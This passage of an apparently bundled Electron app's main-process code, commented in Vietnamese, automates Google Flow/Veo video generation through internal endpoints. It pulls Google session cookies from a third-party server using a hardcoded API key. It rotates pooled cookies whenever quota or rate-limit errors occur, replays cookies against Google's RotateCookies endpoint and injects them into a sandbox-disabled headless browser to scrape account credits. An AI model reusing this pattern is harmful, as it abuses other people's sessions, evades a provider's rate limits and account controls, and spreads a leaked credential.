      videoUrl: h,
    }),
    console.log(`[ExtendedVideo ${a || "general"}] ${i}`);
}; // --- FIX VIDEO MỞ RỘNG (CHỨC NĂNG DỪNG HOẠT ĐỘNG CHUẨN 100%) ---

he.ipcMain.on("extended-video:start", async (event, args) => {
  // 1. Ánh xạ biến
  const prompts = args.prompts || args.i || [];
  const authToken = args.authToken || args.c;
  const aspectRatio = args.aspectRatio || args.f || "LANDSCAPE";
  const autoSaveConfig = args.autoSaveConfig || args.t || {};
  const currentUser = args.currentUser || args.r;
  const useInitialImage = args.useInitialImage || args.l;
  let initialImageBase64 = args.initialImageBase64 || args.e;
  let activeCookie = args.activeCookie || args.ac;
  const localCookieProfiles = Array.isArray(args.localCookies) ? args.localCookies.filter((profile) => profile && (profile.value || profile.cookie)) : [];
  let localCookieIndex = -1;
  let preferLocalAfterAuthFailure = false;
  const deadLocalProfiles = new Set();
  const concurrentStreams = args.concurrentStreams || 1;

  // --- [FIX QUAN TRỌNG] CHUẨN HÓA TỶ LỆ KHUNG HÌNH ---
  // Đảm bảo gửi đúng VIDEO_ASPECT_RATIO_LANDSCAPE thay vì VIDEO_ASPECT_RATIO_16:9
  const isPortrait = aspectRatio === "PORTRAIT" || aspectRatio === "9:16";
  const ratioString = isPortrait
    ? "PORTRAIT"
    : aspectRatio === "16:9"
      ? "LANDSCAPE"
      : aspectRatio.toUpperCase();

  // Đây là chuỗi chuẩn dùng cho cả T2V và I2V
  const validAspectRatio = `VIDEO_ASPECT_RATIO_${ratioString}`;

  // 2. Hàm gửi log
  const sendLog = (id, msg, status, videoUrl = null) => {
    if (($e || Qe) && status === "processing") return;
    const payload = {
      promptId: id,
      message: msg,
      status: status,
      videoUrl: videoUrl,
      operationName: "ExtGen",
      sceneId: `ext-${Date.now()}`,
      mediaId: "vid",
      projectId: "proj",
      cookie: null,
    };
    he.BrowserWindow.getAllWindows().forEach((win) => {
      if (!win.isDestroyed()) win.webContents.send("browser:log", payload);
    });
  };

  console.log(
    `>>> BẮT ĐẦU VIDEO MỞ RỘNG: ${prompts.length} PROMPTS | Tỷ lệ: ${validAspectRatio} <<<`
  );

  // 3. Reset cờ dừng
  Qe = false;
  $e = false;
  newSessionAbortController();
  // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
  if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
  threadTokenCache.clear();
  console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache).");
  // =============================================================

  // Update UI ban đầu
  if (prompts.length > 0) {
    sendLog(prompts[0].id, "Đang khởi động...", "processing");
    for (let k = 1; k < prompts.length; k++) {
      sendLog(prompts[k].id, "Đang trong hàng đợi...", "queued");
    }
  }

  if (!currentUser || !currentUser.subscription) {
    sendLog(prompts[0]?.id, "Lỗi xác thực.", "failed");
    return;
  }

  const tempDir = ye.join(he.app.getPath("temp"), `veo-ext-${Date.now()}`);
  if (!be.existsSync(tempDir))
    await be.promises.mkdir(tempDir, { recursive: true });

  if (initialImageBase64 && initialImageBase64.includes("base64,")) {
    initialImageBase64 = initialImageBase64.split("base64,")[1];
  }

  let currentLastFrame = useInitialImage ? initialImageBase64 : null;
  let videoFiles = [];

  // --- CÁC HÀM XỬ LÝ NỘI BỘ ---

  const getNextLocalCookie = () => {
    if (!localCookieProfiles.length) return null;
    for (let step = 1; step <= localCookieProfiles.length; step++) {
      const nextIndex = (localCookieIndex + step) % localCookieProfiles.length;
      const profile = localCookieProfiles[nextIndex];
      const profileId = profile.id || profile.name || String(nextIndex);
      if (deadLocalProfiles.has(profileId)) continue;
      localCookieIndex = nextIndex;
      const value = profile.value || profile.cookie;
      return { ...profile, value, cookie: value };
    }
    return null;
  };

  const markLocalCookieDead = (cookieItem, reason) => {
    const profileId = cookieItem?.id || cookieItem?.name || String(localCookieIndex);
    deadLocalProfiles.add(profileId);
    sendLog(null, `Cookie local ${cookieItem?.name || profileId} đã DIE (${reason}). Vui lòng lấy cookie mới thủ công.`, "failed");
  };

  const getWorkingCookie = async (reason = "") => {
    if (!reason && activeCookie && (activeCookie.value || typeof activeCookie === "string")) {
      return activeCookie;
    }
    // 1. Ưu tiên lấy Cookie Server trước
    try {
      const fetchFn = global.fetch || require("node-fetch");
      const res = await (
        await fetchFn(kinxCookieUrl(reason), {
          headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${authToken}` },
        })
      ).json();
      if (res.success && res.cookie) {
        activeCookie = res.cookie;
        return res.cookie;
      }
    } catch (e) {
      console.warn("[ExtendedVideo] Server không trả cookie:", e.message);
    }

    // 2. Server không trả cookie -> mới dùng sang Cookie Local Profile dự phòng
    if (activeCookie && (activeCookie.value || typeof activeCookie === "string")) {
      return activeCookie;
    }
    const initialLocal = getNextLocalCookie();
    if (initialLocal) {
      activeCookie = initialLocal;
      return initialLocal;
    }

    throw new Error("Không lấy được Cookie server hoặc Cookie local.");
  };

  // [FIX] Cắt ảnh ra JPEG (Thay vì BMP/PNG để tránh lỗi 400 Upload)
  const extractFrame = (videoPath, outPath) => {
    const jpgPath = outPath.replace(/\.(bmp|png)$/i, ".jpg");
    return new Promise((resolve, reject) => {
      jo(videoPath)
        .inputOptions(["-sseof", "-0.1"])
        .outputOptions([
          "-vframes",
          "1",
          "-f",
          "image2",
          "-q:v",
          "2", // Chất lượng tốt
          "-pix_fmt",
          "yuvj420p", // Định dạng màu chuẩn JPEG
          "-map_metadata",
          "-1", // Xóa metadata rác
          "-flags",
          "+bitexact", // Xóa thông tin encoder
          "-y",
        ])
        .save(jpgPath)
        .on("end", async () => {
          try {
            await cancellableSleep(500);
            const stats = await be.promises.stat(jpgPath);
            if (stats.size === 0) reject(new Error("Ảnh cắt lỗi (0 byte)"));
            else {
              console.log(`[FFmpeg] Cắt JPEG thành công: ${jpgPath}`);
              resolve(jpgPath);
            }
          } catch (e) {
            reject(e);
          }
        })
        .on("error", (err) => reject(err));
    });
  };

  // --- VÒNG LẶP CHÍNH ---
  try {
    for (let i = 0; i < prompts.length; i++) {
      if ($e || Qe) {
        sendLog(null, "Đã dừng quy trình.", "finished");
        break;
      }

      const p = prompts[i];
      sendLog(
        p.id,
        `Đang xử lý phần ${i + 1}/${prompts.length}...`,
        "processing"
      );

      let success = false;
      let retryCount = 0;
      let videoUrl = null;
      let forceNewCookie = false;
      let forceCookieReason = "";

      while (!success) {
        if ($e || Qe) break;

        try {
          if (forceNewCookie) activeCookie = null;
          let cookieItem = await getWorkingCookie(forceNewCookie ? (forceCookieReason || "401") : "");
          forceNewCookie = false;
          forceCookieReason = "";
          let cookie = cookieItem;
          let projectId = null;

          const cachedItem = global.veoCookieCache.find(
            (c) => c.cookie && c.cookie.value === cookie.value
          );
          try {
            if (cachedItem && cachedItem.projectId) {
              projectId = cachedItem.projectId;
            } else {
              // Flow RPC: jHPbke (tạo project) + UpteDb (lấy UUID), cookie dùng chung từ kinxcookie.php
              projectId = await flowCreateProject(authToken, flowDefaultProjectTitle(), cookie);
            }
          } catch (_) { }

          if (!projectId) {
            forceNewCookie = true;
            forceCookieReason = "401";
            throw new Error("401: Lỗi Project (Cookie hết hạn hoặc không tạo được project Flow).");
          }

          const sceneId = `uuid-${Date.now()}-${Math.random()}`;
          const sessionBase = `;${Date.now()}`;
          const captchaToken = null; // We sẽ tự lấy token mới dặm vào body

          let payload, apiUrl;

          // [FIX] Sử dụng originalIndex thay vì i để hỗ trợ chạy tiếp từ giữa
          const isAbsoluteStart = (p.originalIndex === 0 && !useInitialImage);

          if (isAbsoluteStart) {
            // --- TRƯỜNG HỢP 1: TEXT-TO-VIDEO ---
            sendLog(p.id, "Đang tạo Video (Text)...", "processing");
            apiUrl =
              // "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoText";
              "https://flow.google.com/v1/video:batchAsyncGenerateVideoText";

            const modelKey = flowFormatModelKey("veo_3_1_t2v_lite");

            payload = {
              clientContext: {
                sessionId: sessionBase,
                projectId: projectId,
                tool: "IMAGE_FX",
                userPaygateTier: "PAYGATE_TIER_TWO",
              },
              requests: [
                {
                  aspectRatio: validAspectRatio,
                  seed: Math.floor(Math.random() * 1e5),
                  textInput: { structuredPrompt: { parts: [{ text: p.text }] } },
                  videoModelKey: modelKey,
                  metadata: { sceneId },
                },
              ],
            };
          } else {
            // --- TRƯỜNG HỢP 2: IMAGE-TO-VIDEO ---
            if (!currentLastFrame) throw new Error("Thiếu ảnh input.");
            sendLog(p.id, "Đang xử lý ảnh đầu vào...", "processing");

            // A. Chuẩn hóa ảnh sang JPEG
            let cleanBase64 = currentLastFrame;
            let currentImageSize = null;
            try {
              const rawStr = currentLastFrame.includes("base64,")
                ? currentLastFrame.split("base64,")[1]
                : currentLastFrame;

              const imgBuffer = Buffer.from(rawStr, "base64");
              const image = he.nativeImage.createFromBuffer(imgBuffer);
              if (!image.isEmpty()) {
                currentImageSize = image.getSize();
                cleanBase64 = image.toJPEG(95).toString("base64");
              } else {
                cleanBase64 = rawStr;
              }
            } catch (e) {
              console.error("Lỗi chuẩn hóa ảnh:", e);
              if (cleanBase64.includes("base64,")) {
                cleanBase64 = cleanBase64.split("base64,")[1];
              }
            }

            // B. Upload ảnh (ASSET_MANAGER -> IMAGE_FX via bo)
            const cacheKey = `${projectId}_${_r.createHash('md5').update(cleanBase64).digest('hex')}`;

            let mediaId;
            if (global.uploadedImageCache.has(cacheKey)) {
              const cached = global.uploadedImageCache.get(cacheKey);
              if (typeof cached === "string") {
                sendLog(p.id, `Ảnh đầu vào: Đã có sẵn (Cache) ⚡`, "submitting");
                mediaId = cached;
              } else {
                sendLog(p.id, `Ảnh đầu vào: Chờ luồng khác tải... ⏳`, "submitting");
                mediaId = await cached;
              }
            } else {
              sendLog(p.id, "Đang upload ảnh đầu vào...", "submitting");
              const uploadPromise = bo(qe, cleanBase64, cookie, p.id, projectId, "extended-video:log");
              global.uploadedImageCache.set(cacheKey, uploadPromise);
              mediaId = await uploadPromise;
              if (mediaId) {
                global.uploadedImageCache.set(cacheKey, mediaId);
              } else {
                global.uploadedImageCache.delete(cacheKey);
                throw new Error("Lỗi Upload: Không nhận được MediaID.");
              }
            }

            if (mediaId && currentImageSize) {
              if (!global.mediaImageSizeCache) global.mediaImageSizeCache = new Map();
              global.mediaImageSizeCache.set(String(mediaId).toLowerCase(), currentImageSize);
              global.mediaImageSizeCache.set(String(mediaId), currentImageSize);
            }

            if (!mediaId) {
              throw new Error("Lỗi Upload: Không nhận được MediaID sau khi thử lại.");
            }
            if ($e || Qe) break;

            // C. Tạo Video (IMAGE_FX)
            sendLog(p.id, "Đang tạo Video nối tiếp...", "processing");
            apiUrl =
              // "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage";
              "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartImage";

            const modelKey = flowFormatModelKey("veo_3_1_i2v_lite");

            payload = {
              mediaGenerationContext: {
                batchId: `batch-${Date.now()}-${Math.random()}`,
                audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
              },
              clientContext: {
                sessionId: sessionBase,
                projectId: projectId,
                tool: "IMAGE_FX",
                userPaygateTier: "PAYGATE_TIER_TWO",
              },
              requests: [
                {
                  startImage: {
                    mediaId: mediaId,
                    width: currentImageSize?.width,
                    height: currentImageSize?.height
                  },
                  aspectRatio: validAspectRatio,
                  seed: Math.floor(Math.random() * 1e5),
                  textInput: { structuredPrompt: { parts: [{ text: (p.text || "").trim() }] } },
                  metadata: { sceneId },
                  videoModelKey: modelKey,
                },
              ],
            };
          }

          const genRes = await We(null, {
            url: apiUrl,
            cookie: cookie,
            options: {
              method: "POST",
              headers: {},
              body: { ...payload, useV2ModelConfig: true },
            },
          });

          const workflow = genRes?.workflows?.[0];
          const media = genRes?.media?.[0];
          const opName = media?.name || workflow?.name || genRes?.media?.[0]?.operation?.name;

          if (!opName)
            throw new Error("Lỗi API Veo (Không có Workflow Name). Phản hồi: " + JSON.stringify(genRes));

          // Polling
          let polling = true;
          while (polling) {
            if ($e || Qe) {
              polling = false;
              break;
            }
            await cancellableSleep(40000);
            if ($e || Qe) {
              polling = false;
              break;
            }
            const checkRes = await We(null, {
              // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              cookie: cookie,
              options: {
                method: "POST",
                body: { media: [{ name: opName, projectId: projectId }] },
              },
            });

            console.log("[Extended Video] checkRes:", JSON.stringify(checkRes).substring(0, 500));
            const opStatus = checkRes?.media?.[0] || checkRes?.media?.[0] || checkRes;

            const statusStr = (opStatus?.status || opStatus?.mediaMetadata?.mediaStatus?.mediaGenerationStatus || opStatus?.mediaStatus?.mediaGenerationStatus || "").toUpperCase();

            if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
              const vidMeta = opStatus.operation?.metadata?.video || opStatus.video || checkRes.video;
              videoUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri;
              if (!videoUrl) {
                try {
                  let mId = "";
                  if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name || opName;
                  if (mId) {
                    const fetchFn = global.fetch || require("node-fetch");
                    let cVal = "";
                    if (typeof cookie !== 'undefined') cVal = cookie;
                    if (typeof cVal === "object") cVal = cVal.value;


                    console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                    const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                    if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                      videoUrl = redirectRes.headers.get("location");
                    } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                      videoUrl = redirectRes.url;
                    } else {
                      try {
                        const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                        const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                        if (signed) { videoUrl = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                      } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                    }
                  }
                } catch (e) {
                  console.error("Lỗi Redirect API:", e);
                }
              }
              polling = false;
            } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
              const detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Không có chi tiết lỗi từ Google";
              console.error(`[Extended Video] Chi tiết lỗi FAILED:`, JSON.stringify(opStatus));
              throw new Error(`Lỗi Veo API (FAILED): ${detail}`);
            }
          }

          if ($e || Qe) break;
          if (!videoUrl) throw new Error("Không có URL video.");

          // Tải và Cắt Frame (Chuẩn bị cho vòng sau)
          sendLog(p.id, "Đang tải video...", "downloading");
          const vidPath = ye.join(tempDir, `seg_${i}.mp4`);
          const vidBuffer = await (await fetch(videoUrl)).arrayBuffer();
          await be.promises.writeFile(vidPath, Buffer.from(vidBuffer));
          videoFiles.push(vidPath);

          if (i < prompts.length - 1) {
            sendLog(p.id, "Đang cắt frame cuối...", "processing");
            // Đường dẫn file (sẽ tự động đổi đuôi thành .jpg trong hàm extractFrame mới)
            const frameTarget = ye.join(tempDir, `frame_${i}.jpg`);

            // Cắt ra JPEG sạch
            const cleanJpgPath = await extractFrame(vidPath, frameTarget);
            const frameBuff = await be.promises.readFile(cleanJpgPath);
            currentLastFrame = frameBuff.toString("base64");
          }

          success = true;
          sendLog(p.id, "Hoàn thành phân đoạn!", "success", videoUrl);
        } catch (err) {
          if ($e || Qe) break;
          retryCount++;
          const msg = String(err.message || "").toLowerCase();
          let statusMsg = `Lỗi: ${err.message}`;
          const isAuthError = msg.includes("401") || msg.includes("unauthenticated") || msg.includes("unauthorized") || msg.includes("snlm0e") || msg.includes("hết hạn");
          const isRateError = msg.includes("429") || msg.includes("quota") || msg.includes("resource_exhausted") || msg.includes("rate limit") || msg.includes("throttled");

          if (isAuthError) {
            statusMsg = "401: Lỗi xác thực (Auth) -> Đang đổi Cookie mới...";
            const deadProfile = localCookieProfiles.find((profile) => (profile.value || profile.cookie) === activeCookie?.value);
            if (deadProfile) markLocalCookieDead(deadProfile, "401");
            activeCookie = null;
            preferLocalAfterAuthFailure = true;
            forceNewCookie = true;
            forceCookieReason = "401";
          } else if (msg.includes("403")) {
            statusMsg = "403: Flow web bị chặn, giữ nguyên Cookie";
            forceNewCookie = false;
          } else if (isRateError) {
            statusMsg = "429: Quota/rate limit -> Đang đổi Cookie mới...";
            const deadProfile = localCookieProfiles.find((profile) => (profile.value || profile.cookie) === activeCookie?.value);
            if (deadProfile) markLocalCookieDead(deadProfile, "429");
            activeCookie = null;
            preferLocalAfterAuthFailure = true;
            forceNewCookie = true;
            forceCookieReason = "429";
          } else if (msg.includes("safety") || msg.includes("unsafe")) {
            statusMsg = "Vi phạm chính sách";
            sendLog(p.id, statusMsg, "failed");
            throw new Error("Dừng quy trình do vi phạm chính sách.");
          } else if (msg.includes("mediaid") || msg.includes("upload")) {
            statusMsg = "Lỗi upload ảnh. Giữ nguyên Cookie";
            forceNewCookie = false;
          } else if (msg.includes("400") || msg.includes("bad request")) {
            statusMsg = "400: Sai định dạng (Bad Request)";
            forceNewCookie = false;
          } else if (msg.includes("500") || msg.includes("timeout") || msg.includes("network")) {
            statusMsg = "500: Lỗi Server/Timeout. Giữ nguyên Cookie";
            forceNewCookie = false;
          }

          sendLog(p.id, `${statusMsg}. Thử lại #${retryCount}/3`, retryCount >= 3 ? "failed" : "processing");
          if (retryCount >= 3) break;
          await cancellableSleep(4000);
        }
      }

      if ($e || Qe) {
        sendLog(p.id, "Đã dừng.", "idle");
        break;
      }
      if (!success && !($e || Qe)) {
        throw new Error("Dừng quy trình do lỗi.");
      }
    }

    // Ghép Video
    if (videoFiles.length > 0 && !$e && !Qe) {
      sendLog(null, "Đang ghép toàn bộ video...", "processing");
      let finalPath;
      if (autoSaveConfig.enabled && autoSaveConfig.path) {
        if (!be.existsSync(autoSaveConfig.path))
          be.mkdirSync(autoSaveConfig.path, { recursive: true });
        finalPath = ye.join(autoSaveConfig.path, `Extended_${Date.now()}.mp4`);
      } else {
        finalPath = ye.join(
          he.app.getPath("downloads"),
          `Extended_${Date.now()}.mp4`
        );
      }

      const listPath = ye.join(tempDir, "list.txt");
      const fileListContent = videoFiles
        .map((f) => `file '${f.replace(/\\/g, "/").replace(/'/g, "'\\''")}'`)
        .join("\n");
      be.writeFileSync(listPath, fileListContent);

      await new Promise((res, rej) => {
        jo()
          .input(listPath)
          .inputOptions(["-f", "concat", "-safe", "0"])
          // --- BẮT ĐẦU SỬA LỖI FFMPEG CRASH ---
          // Bỏ "-c copy", sử dụng mã hóa lại để ép chuẩn thông số các đoạn video bị lệch của AI
          .outputOptions([
            "-c:v", "libx264",       // Dùng mã hóa H.264 cực kỳ ổn định
            "-preset", "fast",       // Tốc độ ghép nhanh
            "-crf", "18",            // Giữ chất lượng video rất cao (ngang với gốc)
            "-pix_fmt", "yuv420p",   // Chuẩn màu tương thích mọi trình phát
            "-vsync", "vfr",         // Sửa lỗi lệch FPS giữa các đoạn video
            "-c:a", "aac",           // Mã hóa lại audio để tránh crash nếu video mất kênh audio
            "-b:a", "192k"
          ])
          // --- KẾT THÚC SỬA LỖI ---
          .save(finalPath)
          .on("end", res)
          .on("error", (err) => {
            console.error("[FFmpeg Merge Error Details]:", err.message);
            rej(err);
          });
      });

      sendLog(null, "Ghép xong! Đã lưu video.", "finished");
      he.BrowserWindow.getAllWindows().forEach((win) => {
        if (!win.isDestroyed())
          win.webContents.send("download-complete", {
            success: true,
            path: finalPath,
          });
      });
    }
  } catch (err) {
    console.error(err);
    sendLog(null, `Quy trình dừng: ${err.message}`, "error");
  } finally {
    try {
      if (be.existsSync(tempDir))
        be.rmSync(tempDir, { recursive: true, force: true });
    } catch { }
  }
});
ut.autoUpdater.autoDownload = !1;
ut.autoUpdater.autoInstallOnAppQuit = !0;
function yr(a, i, c = null) {
  a && !a.isDestroyed() && a.webContents.send("update-message", i, c);
}
async function checkMaintenance() {
  try {
    const axios = require("axios");
    const response = await axios.get("https://tainguyenweb.com/apiveo/baotri.php?api=1", { timeout: 5000 });
    const data = response.data;
    if (data && data.success && data.maintenance) {
      console.log("[Main] System in maintenance mode");
      const mainWindow = new he.BrowserWindow({
        width: 550,
        height: 450,
        center: true,
        resizable: false,
        frame: false,
        alwaysOnTop: true,
        show: true,
        webPreferences: { contextIsolation: true, nodeIntegration: false, preload: ye.join(__dirname, "preload.js"), userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36' }
      });
      mainWindow.loadFile(ye.join(__dirname, "..", "dist", "maintenance.html"));
      return true;
    }
    return false;
  } catch (e) {
    console.log("[Main] Maintenance check error:", e.message);
    return false;
  }
}
async function nc() {
  const inMaintenance = await checkMaintenance();
  if (inMaintenance) {
    console.log("[Main] App startup blocked - maintenance mode");
    return;
  }
  const a = he.screen.getPrimaryDisplay(),
    { width: i, height: c } = a.workAreaSize;
  (qe = new he.BrowserWindow({
    width: i,
    height: c,
    autoHideMenuBar: !0,
    titleBarStyle: "default",
    webPreferences: {
      contextIsolation: !0,
      nodeIntegration: !1,
      preload: ye.join(__dirname, "preload.js"),
      devTools: false,
      webSecurity: !To,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    },
  })),
    So
      ? qe.loadURL(So)
      : (qe.loadFile(ye.join(__dirname, "..", "dist", "index.html")),
        qe.once("ready-to-show", () => {
          ut.autoUpdater.checkForUpdatesAndNotify();
        })),
    ut.autoUpdater.on("update-available", (h) => {
      yr(qe, "update-available", h), ut.autoUpdater.downloadUpdate();
    }),
    ut.autoUpdater.on("update-not-available", (h) => {
      yr(qe, "update-not-available", h);
    }),
    ut.autoUpdater.on("download-progress", (h) => {
      yr(qe, "download-progress", h);
    }),
    ut.autoUpdater.on("update-downloaded", (h) => {
      yr(qe, "update-downloaded", h);
    }),
    ut.autoUpdater.on("error", (h) => {
      yr(qe, "error", h.message);
    });
}
he.app.whenReady().then(() => {
  he.session.defaultSession.protocol.registerFileProtocol("file", (a, i) => {
    const c = decodeURI(a.url.replace("file:///", ""));
    i(c);
  }),
    To ||
    he.session.defaultSession.webRequest.onHeadersReceived((a, i) => {
      if (!a.url.startsWith("file://")) {
        // iframe nhúng (http/https) bỏ qua CSP để không chặn Tailwind CDN
        i({ responseHeaders: a.responseHeaders });
        return;
      }
      i({
        responseHeaders: {
          ...a.responseHeaders,
          "Content-Security-Policy": [
            "script-src 'self'; media-src 'self' file: data: blob: *;",
          ],
        },
      });
    }),
    he.ipcMain.handle("fetch-api", We);

  // ===========================================================================
  // --- [BACKEND] XỬ LÝ TẠO ẢNH NHÂN VẬT (WHISK/NANO BANANA) ---
  // ===========================================================================
  let whiskSharedImages = new Map();

  he.ipcMain.handle("whisk:store-image", async (event, { key, base64 }) => {
    whiskSharedImages.set(key, base64);
    return { success: true };
  });

  he.ipcMain.handle("whisk:clear-images", async () => {
    whiskSharedImages.clear();
    return { success: true };
  });

  he.ipcMain.handle("whisk:start-image-automation", async (event, args) => {
    try {
      const { prompts, model, aspectRatio, authToken } = args;
      event.sender.send("browser:log", {
        message: "Đang khởi tạo trình duyệt tạo nhân vật AI...",
        status: "starting"
      });

      // Gọi ngược lại hàm xử lý automation hiện có trong main.js
      he.ipcMain.emit("browser:start-automation", event, {
        prompts,
        model,
        aspectRatio,
        authToken,
        isWhisk: true
      });
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });
  // ===========================================================================
  // --- [PROFILE MANAGER] HANDLERS ---
  // ===========================================================================
  // Helper trích xuất expiry từ JWT Bearer token
  function extractJwtExp(bearerHeader) {
    if (!bearerHeader || typeof bearerHeader !== 'string') return 0;
    const token = bearerHeader.replace(/^Bearer\s+/i, '');
    // JWT format: header.payload.signature, payload base64url encoded
    const parts = token.split('.');
    if (parts.length !== 3) return 0; // không phải JWT (có thể là ya29.xxx opaque token)
    try {
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      if (payload.exp && typeof payload.exp === 'number') {
        return payload.exp * 1000; // convert seconds to milliseconds
      }
    } catch (e) { }
    return 0;
  }

  // Interactive sniffing với BrowserWindow hiển thị cho user login
  // --- FLOW COOKIE & ROTATE HELPERS ---
  function flowParseCookies(str) {
    const map = new Map();
    if (!str) return map;
    const parts = String(str).split(';');
    for (const part of parts) {
      const idx = part.indexOf('=');
      if (idx !== -1) {
        const k = part.substring(0, idx).trim();
        const v = part.substring(idx + 1).trim();
        if (k) map.set(k, v);
      }
    }
    return map;
  }

  function flowBuildCookieString(map) {
    return Array.from(map.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }

  function flowMergeCookies(origCookie, setCookieHeaders) {
    const map = flowParseCookies(origCookie);
    const arr = Array.isArray(setCookieHeaders) ? setCookieHeaders : (setCookieHeaders ? [setCookieHeaders] : []);
    for (const item of arr) {
      if (!item || typeof item !== 'string') continue;
      const cookiePart = item.split(';')[0];
      const idx = cookiePart.indexOf('=');
      if (idx !== -1) {
        const k = cookiePart.substring(0, idx).trim();
        const v = cookiePart.substring(idx + 1).trim();
        if (k) map.set(k, v);
      }
    }
    return flowBuildCookieString(map);
  }

  async function flowRotateProfileCookie(currentCookie) {
    if (!currentCookie || typeof currentCookie !== 'string') {
      return { success: false, error: 'COOKIE_EMPTY', needLogin: true };
    }
    const cleanCookie = currentCookie.replace(/\*\*Secure-/g, '__Secure-').replace(/\*\*Host-/g, '__Host-');
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36';

    console.log('[Rotate] Bắt đầu gọi RotateCookies cho Flow (og_pid=749)...');
    try {
      const fetchFn = global.fetch || require('node-fetch');
      const res = await fetchFn('https://accounts.google.com/RotateCookies', {
        method: 'POST',
        headers: {
          accept: '*/*',
          'content-type': 'application/json',
          origin: 'https://accounts.google.com',
          referer: 'https://accounts.google.com/RotateCookiesPage?og_pid=749&rot=3&origin=https%3A%2F%2Fflow.google.com&exp_id=0',
          'user-agent': ua,
          cookie: cleanCookie,
        },
        body: JSON.stringify([749, String(Math.floor(Math.random() * 9e18))]),
      });

      const sc = res.headers.getSetCookie ? res.headers.getSetCookie() : (res.headers.raw?.()['set-cookie'] || []);
      console.log('[Rotate] RotateCookies status:', res.status, 'Set-Cookie count:', sc.length);
      let merged = flowMergeCookies(cleanCookie, sc);

      console.log('[Rotate] Kiểm tra flow.google.com...');
      const flowRes = await fetchFn('https://flow.google.com/', {
        headers: {
          'user-agent': ua,
          cookie: merged,
          accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'accept-language': 'vi,en;q=0.8',
        },
      });

      const flowSc = flowRes.headers.getSetCookie ? flowRes.headers.getSetCookie() : (flowRes.headers.raw?.()['set-cookie'] || []);
      merged = flowMergeCookies(merged, flowSc);
      const html = await flowRes.text();
      const atMatch = html.match(/"SNlM0e":\s*"([^"]+)"/) || html.match(/"SNlM0e":"([^"]+)"/);
      const at = atMatch ? atMatch[1] : null;
      const alive = flowRes.status === 200 && !!at;
      console.log('[Rotate] Flow status:', flowRes.status, 'Alive:', alive, 'at token:', at ? 'Found' : 'None');

      if (!alive && !merged.includes('__Secure-1PSID=') && !merged.includes('SID=')) {
        return { success: false, needLogin: true, error: 'COOKIE_EXPIRED' };
      }

      return {
        success: true,
        cookie: merged,
        bearerToken: at || 'FLOW_SESSION',
        bearerExpiresAt: Date.now() + 30 * 24 * 3600 * 1000,
        status: 'logged_in',
      };
    } catch (err) {
      console.error('[Rotate] Lỗi:', err.message);
      return { success: false, error: err.message, needLogin: false };
    }
  }
  global.flowRotateProfileCookie = flowRotateProfileCookie;

  // Interactive sniffing với BrowserWindow hoặc Puppeteer trên flow.google.com

  // Trích xuất số dư credit và gói (tier) từ giao diện Google Flow
  async function flowExtractCredits(cookieStr, ua) {
    if (!cookieStr) return null;
    const cookies = [];
    cookieStr.split(';').forEach(part => {
      const trimmed = part.trim();
      const idx = trimmed.indexOf('=');
      if (idx === -1) return;
      const name = trimmed.substring(0, idx).trim();
      const value = trimmed.substring(idx + 1).trim();
      if (!name || !value) return;
      cookies.push({
        name,
        value,
        domain: name.startsWith('__Host-') ? 'flow.google.com' : '.google.com',
        path: '/',
        secure: name.startsWith('__Secure-') || name.startsWith('__Host-'),
        httpOnly: false,
      });
    });

    let browser;
    try {
      const puppeteer = require('puppeteer');
      browser = await puppeteer.launch({
        headless: 'new',
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-gpu',
          '--blink-settings=imagesEnabled=false',
        ]
      });

      const page = await browser.newPage();
      for (const c of cookies) {
        try { await page.setCookie(c); } catch (e) { }
      }
      if (ua) await page.setUserAgent(ua);

      await page.goto('https://flow.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 });

      // Kiểm tra nếu trang là trang giới thiệu (chưa đăng nhập)
      const isLoggedOut = await page.evaluate(() => {
        const t = document.body.innerText || '';
        return t.includes('Studio sáng tạo AI của bạn') || t.includes('Tạo bằng Google Flow');
      });
      if (isLoggedOut) {
        await browser.close().catch(() => { });
        return { loggedIn: false };
      }

      // Đợi avatar xuất hiện (timeout 8s để Angular kịp render sau domcontentloaded)
      const avatarEl = await page.waitForSelector('img[src*="googleusercontent"], button[aria-label*="Google"]', { timeout: 8000 }).catch(() => null);

      if (avatarEl) {
